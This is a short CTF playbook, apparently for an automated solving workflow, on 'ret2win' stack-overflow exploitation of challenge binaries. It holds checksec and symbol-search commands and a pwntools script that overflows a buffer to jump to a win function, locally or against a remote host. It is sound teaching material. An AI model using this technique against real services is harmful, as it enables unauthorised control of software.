# Pwn: ret2win

## When to Use

Binary has a reachable overflow and a known `win`, `get_flag`, `print_flag`, or shell helper function.

## Quick Checks

```bash
checksec ./chall
nm -an ./chall | grep -Ei ' win$|get_flag|print_flag|shell|system'
python3 - <<'PY'
from pwn import *
print(cyclic(200))
PY
```

## Script Skeleton

```python
import os
from pwn import *
elf = context.binary = ELF('./chall')
io = remote(os.environ['HOST'], int(os.environ['PORT'])) if os.getenv('REMOTE') else process(elf.path)
payload = flat({OFFSET: elf.symbols['win']})
io.sendline(payload)
out = io.recvall(timeout=5)
open(f"{os.environ['WORKDIR']}/evidence/pwn_success.log", 'wb').write(out)
print(out.decode(errors='replace'))
```

## Common Failures

- Wrong offset: prove with cyclic crash and register value.
- Stack alignment on amd64: add a single `ret` gadget before `win`.
- Protocol sync: wait for prompt before sending payload.

## Next Action

Find offset, confirm target address, write `$WORKDIR/scripts/exploit.py`, run locally, then remote.

## Evidence Standard

Transcript must contain exact flag and command used to run exploit.
